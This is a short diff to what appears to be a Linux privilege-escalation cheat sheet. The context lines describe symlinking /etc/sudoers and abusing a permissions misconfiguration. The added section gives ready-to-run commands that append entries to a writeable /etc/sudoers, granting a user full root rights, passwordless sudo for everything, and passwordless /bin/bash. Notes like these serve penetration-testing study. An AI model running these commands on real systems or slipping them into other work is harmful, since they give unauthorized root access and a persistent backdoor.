@@ -33,3 +33,11 @@
     ln -s /etc/sudoers /home/USER/sudoers
 
 ### Then, if there is a misconfiguration that enables our user to give permissions to arbitrary files, then we can edit the sudoers file to give our user rights to execute ANYTHING without password as root via sudo
+
+## Writeable /etc/sudoers example
+
+    echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
+    
+    # use SUDO without password
+    echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
+    echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
